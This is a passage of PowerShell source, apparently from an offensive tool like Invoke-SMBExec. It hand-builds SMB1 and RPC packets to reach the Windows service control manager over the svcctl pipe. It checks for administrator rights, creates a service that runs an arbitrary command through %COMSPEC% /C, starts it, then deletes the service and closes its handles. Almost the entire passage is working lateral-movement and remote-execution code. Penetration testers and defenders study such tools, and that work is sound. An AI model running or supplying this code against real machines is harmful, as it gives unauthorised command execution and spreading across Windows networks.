            $SMB_service = $Service

            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)



            if([Bool]($SMB_service.Length % 2))

            {

                $SMB_service_bytes += 0x00,0x00

            }

            else

            {

                $SMB_service_bytes += 0x00,0x00,0x00,0x00

                

            }



        }

        

        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)



        if($CommandCOMSPEC -eq 'Y')

        {

            $Command = "%COMSPEC% /C `"" + $Command + "`""

        }

        else

        {

            $Command = "`"" + $Command + "`""

        }



        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}



        if([Bool]($Command.Length % 2))

        {

            $SMBExec_command += '00-00'

        }

        else

        {

            $SMBExec_command += '00-00-00-00'

        }    

        

        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  

        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)

        $SMB_split_index = 4256

        

        if($SMB_version -eq 'SMB1')

        {

            $SMB_client_stage = 'TreeConnectAndXRequest'



            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')

            {

            

                switch ($SMB_client_stage)

                {

            

                    'TreeConnectAndXRequest'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBTreeConnectAndXRequest $SMB_path_bytes

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'CreateAndXRequest'

                    }

                  

                    'CreateAndXRequest'

                    {

                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl

                        $SMB_tree_ID = $SMB_client_receive[28,29]

                        $packet_SMB_header = Get-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'RPCBind'

                    }

                

                    'RPCBind'

                    {

                        $SMB_FID = $SMB_client_receive[42,43]

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $packet_RPC_data = Get-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadAndXRequest'

                        $SMB_client_stage_next = 'OpenSCManagerW'

                    }

               

                    'ReadAndXRequest'

                    {

                        Start-Sleep -m $Sleep

                        $packet_SMB_header = Get-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBReadAndXRequest $SMB_FID

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = $SMB_client_stage_next

                    }

                

                    'OpenSCManagerW'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $packet_SCM_data = Get-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadAndXRequest'

                        $SMB_client_stage_next = 'CheckAccess'           

                    }



                    'CheckAccess'

                    {



                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')

                        {

                            $SMB_service_manager_context_handle = $SMB_client_receive[88..107]



                            if($SMB_execute)

                            {

                                Write-Verbose "$output_username is a local administrator on $Target"  

                                $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes

                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data



                                if($SCM_data.Length -lt $SMB_split_index)

                                {

                                    $SMB_client_stage = 'CreateServiceW'

                                }

                                else

                                {

                                    $SMB_client_stage = 'CreateServiceW_First'

                                }



                            }

                            else

                            {

                                Write-Output "$output_username is a local administrator on $Target"

                                $SMB_close_service_handle_stage = 2

                                $SMB_client_stage = 'CloseServiceHandle'

                            }



                        }

                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')

                        {

                            Write-Output "$output_username is not a local administrator or does not have required privilege on $Target"

                            $SMBExec_failed = $true

                        }

                        else

                        {

                            Write-Output "Something went wrong with $Target"

                            $SMBExec_failed = $true

                        }



                    }

                

                    'CreateServiceW'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                             

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadAndXRequest'

                        $SMB_client_stage_next = 'StartServiceW'

                    }



                    'CreateServiceW_First'

                    {

                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]

                        $packet_RPC_data = Get-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first

                        $packet_RPC_data["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)

                        $SMB_split_index_tracker = $SMB_split_index

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                        if($SMB_split_stage_final -le 2)

                        {

                            $SMB_client_stage = 'CreateServiceW_Last'

                        }

                        else

                        {

                            $SMB_split_stage = 2

                            $SMB_client_stage = 'CreateServiceW_Middle'

                        }



                    }



                    'CreateServiceW_Middle'

                    {

                        $SMB_split_stage++

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]

                        $SMB_split_index_tracker += $SMB_split_index

                        $packet_RPC_data = Get-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle

                        $packet_RPC_data["RPCRequest_AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null



                        if($SMB_split_stage -ge $SMB_split_stage_final)

                        {

                            $SMB_client_stage = 'CreateServiceW_Last'

                        }

                        else

                        {

                            $SMB_client_stage = 'CreateServiceW_Middle'

                        }



                    }



                    'CreateServiceW_Last'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]

                        $packet_RPC_data = Get-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadAndXRequest'

                        $SMB_client_stage_next = 'StartServiceW'

                    }



                    'StartServiceW'

                    {

                    

                        if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')

                        {

                            Write-Verbose "Service $SMB_service created on $Target"

                            $SMB_service_context_handle = $SMB_client_receive[92..111]

                            $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                            if($SMB_signing)

                            {

                                $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                                $SMB_signing_counter = $SMB_signing_counter + 2 

                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                                $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                            }



                            $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle

                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                            $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00

                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                            $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                             

                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                            if($SMB_signing)

                            {

                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                                $SMB_signature = $MD5.ComputeHash($SMB_sign)

                                $SMB_signature = $SMB_signature[0..7]

                                $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                            }



                            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            Write-Verbose "Trying to execute command on $Target"

                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                            $SMB_client_stream.Flush()

                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                            $SMB_client_stage = 'ReadAndXRequest'

                            $SMB_client_stage_next = 'DeleteServiceW'  

                        }

                        elseif([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '31-04-00-00')

                        {

                            Write-Output "Service $SMB_service creation failed on $Target"

                            $SMBExec_failed = $true

                        }

                        else

                        {

                            Write-Output "Service creation fault context mismatch"

                            $SMBExec_failed = $true

                        }

    

                    }

                

                    'DeleteServiceW'

                    { 



                        if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1d-04-00-00')

                        {

                            Write-Output "Command executed with service $SMB_service on $Target"

                        }

                        elseif([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '02-00-00-00')

                        {

                            Write-Output "Service $SMB_service failed to start on $Target"

                        }



                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data



                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        $SMB_client_stage = 'ReadAndXRequest'

                        $SMB_client_stage_next = 'CloseServiceHandle'

                        $SMB_close_service_handle_stage = 1

                    }



                    'CloseServiceHandle'

                    {

                        if($SMB_close_service_handle_stage -eq 1)

                        {

                            Write-Verbose "Service $SMB_service deleted on $Target"

                            $SMB_close_service_handle_stage++

                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle

                        }

                        else

                        {

                            $SMB_client_stage = 'CloseRequest'

                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle

                        }

                        $packet_SMB_header = Get-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signing_sequence

                        }



                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = Get-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service



                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["SMBHeader_Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }



                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null

                        $SMB_client_stream.Flush()

                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    }



                    'CloseRequest'

                    {

                        $packet_SMB_header = Get-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID_bytes $SMB_user_ID



                        if($SMB_signing)

                        {

                            $packet_SMB_header["SMBHeader_Flags2"] = 0x05,0x48

